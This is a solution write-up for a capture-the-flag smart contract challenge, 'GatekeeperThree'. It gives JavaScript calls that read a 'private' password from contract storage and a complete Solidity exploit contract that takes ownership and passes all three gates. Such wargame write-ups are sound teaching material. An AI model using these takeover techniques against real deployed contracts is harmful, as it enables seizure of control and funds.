# Answer

Goal: Become an entrant in `GatekeeperThree` contract instance.

## 1. Gate passing requirements

The gatekeeper method that we want to call is `enter()`, since it sets the `tx.origin` to `entrant`. The `enter()` is wrapped by three modifiers. To work around each, the requirements are:

- **gateOne** - the `msg.sender` and `tx.origin`, can't be the same address. And `msg.sender` has to be owner. The `msg.sender` should be a contract, which calls the `construct0r()` function to become the `owner`.
- **gateTwo** - `allowEntrance` should be set to true. This can be achieved if we supplied the `password` stored in `SimpleTrick`. We can reuse the web3 `getStorageAt()` to find that out.
- **gateThree** - requires the contract to funded atleast 0.001 ETH and should fail sending that amount to `msg.sender`. The contract should simply not implement payable `receive()` or `fallback()`.


## 2. Initialize the trick and fetch password

Before we can start constructing the exploit contract we have to call `createTrick()` so that `GatekeeperThree` would create a `SimpleTrick` instance for itself. And consequently we could read the `password` slot for `gateTwo` modifier.

```javascript
await contract.createTrick()
```

Now we can read the password slot value:

```javascript
await web3.eth.getStorageAt(contract.trick(), 2)
```

## 3. Resulting contract

Taken into account all previously mentioned requirements, here is the resulting contract:

```solidity
contract GatekeeperThreeExploit {
    GatekeeperThree g;

    // Don't forget to fund the contract
    constructor(address payable targetAddr) public payable {
        g = GatekeeperThree(targetAddr);
    }

    function enter(uint256 password_) public {
        // gateOne
        g.construct0r();

        // gateTwo
        g.getAllowance(password_);

        // gateThree
        if (address(g).balance <= 0.001 ether) {
            bool success = payable(g).send(0.0011 ether - address(g).balance);
            require(success, "Failed to send ether");
        }

        g.enter();
    }
}

```

During deployment the address of `GatekeeperThree` should be provided to the constructor and a minimum of 0.001 ETH deposited. After that supply the fetched password value when calling `GatekeeperThreeExploit.enter()`.

NOTE: there was an alternative way to get the `password` value, using `SimpleTrick.trickyTrick()`, but the current solution seemed more straightforward.